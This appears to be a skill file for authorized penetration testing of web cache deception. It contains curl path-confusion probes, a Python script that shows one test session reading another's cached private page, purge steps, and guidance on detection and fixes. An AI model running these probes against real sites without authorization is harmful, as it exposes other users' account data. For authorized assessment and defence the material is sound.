---
name: cache-deception
description: Use when testing for web cache deception on an authorized
  assessment. Covers path confusion, cache key analysis, authenticated
  content caching, and proving cross user cache poisoning safely. Also
  use when a CDN or reverse proxy sits in front of the application.
version: 1.0.0
domain: web
lifecycle: stable
last_verified: "2026-10-23"
requires: []
extends: []
relates: [cache-poisoning, header-injection, webapp-pentest-methodology]
tools:
  - name: Python
    version: "3.12"
  - name: Burp Suite
    version: "2026.2"
  - name: curl
    version: "8.5"
---

Web cache deception tricks the cache into storing one user's private
page under a public URL, so the next visitor gets someone else's
account details. This skill covers authorized testing: finding cache
key confusion, proving the cache stores authenticated content, and
demonstrating the leak with test accounts only. Use canary markers,
purge after testing, and never target real user sessions.

## Quick Workflow

1. Map the caching layer: headers that reveal it (Age, X-Cache, CF
   cache status) and its behavior.
2. Learn the cache key: which parts of the request (path, query,
   headers) decide hits.
3. Try path confusion: append a static extension to an authenticated
   path (/account/secret.css).
4. Check the response: does the cache store it, and under what key.
5. Prove cross user impact with two test accounts: victim caches,
   attacker retrieves.
6. Test cache busting resistance: can the attacker force the victim's
   URL to be cached.
7. Purge every poisoned entry you created.
8. Recommend the fixes: cache key normalization and no-cache on
   authenticated content.

## 1. Cache mapping

```bash
# Identify the cache and its key behavior
curl -s -i 'https://target.example/static/app.css' | grep -i -E "^(age|x-cache|cf-cache-status|via):" | head
# Repeat a request and watch Age grow: cached. Age missing: not cached.
for i in 1 2 3; do
  curl -s -i 'https://target.example/account' -H "Cookie: session=$VICTIM" \
    | grep -i -E "^(age|x-cache):" | tr '\n' ' '; echo
  sleep 1
done
```

```bash
# Path confusion probes: authenticated path + static looking suffix
for p in "/account/x.css" "/account/x.js" "/account%2fx.css" \
         "/account;/x.css" "/account/.css"; do
  echo "=== $p"
  curl -s -i "https://target.example$p" -H "Cookie: session=$VICTIM" \
    | grep -i -E "^(HTTP|age|x-cache|content-type):" | head -5
done
# Cached (Age present or HIT) + private content = the vulnerability pattern
```

## 2. Cross user proof (test accounts only)

```python
#!/usr/bin/env python3
"""Cache deception proof with two test accounts (authorized target)."""
import urllib.request

BASE = "https://target.example"
VICTIM = "session=victim_test_session"
ATTACKER = "session=attacker_test_session"
POISON_PATH = "/account/secret.css"  # path confusion candidate

def get(path, cookie):
    req = urllib.request.Request(BASE + path, headers={"Cookie": cookie})
    with urllib.request.urlopen(req, timeout=15) as r:
        return r.status, dict(r.getheaders()), r.read()[:500]

# Victim (logged in) requests the confusing path -> may populate cache
s1, h1, b1 = get(POISON_PATH, VICTIM)
print("victim:", s1, "cache:", h1.get("X-Cache"), "has canary:", b"VICTIM_CANARY" in b1)
# Attacker (different session) requests the same path
s2, h2, b2 = get(POISON_PATH, ATTACKER)
print("attacker:", s2, "cache:", h2.get("X-Cache"), "sees victim data:", b"VICTIM_CANARY" in b2)
```

```bash
# PURGE after testing: remove every entry you poisoned
curl -s -X PURGE "https://target.example/account/secret.css" | head -c 200
# Or use the CDN purge API; confirm with a fresh request showing MISS
```

## Edge cases

- The cache keys on cookies. Then deception fails; verify the key
  includes the session cookie before moving on.
- The app sends Cache-Control: private but the CDN ignores it.
  Test the actual behavior, not the headers.
- Path confusion blocked by the WAF. Try encoded variants, but one
  round is enough; do not fight the WAF all day.
- The "private" content is actually public. Confirm the page really
  contains per user data before claiming impact.

## Escalation

- Deception works but purging is unavailable: limit testing to a
  single canary URL and coordinate purge with the client.
- The cache is shared across tenants: the impact is worse; prove
  with test tenants on each side.
- No cache at all: this skill does not apply; check the CDN config
  anyway for the report.

## Detection and defender view

Defenders see cache deception as requests for odd paths (account
pages with .css suffixes), cache HITs on authenticated URLs, and
poisoned entries served to multiple users. Detect with alerts on
authenticated content being cached and on cache key anomalies. The
durable fix: normalize cache keys, never cache responses with
Set-Cookie or private content, and honor Cache-Control from the
origin.

## Key references

- CWE-524 (Use of Cache Containing Sensitive Information).
- CWE-200 (Exposure of Sensitive Information).
- Web cache deception research (Black Hat presentations).
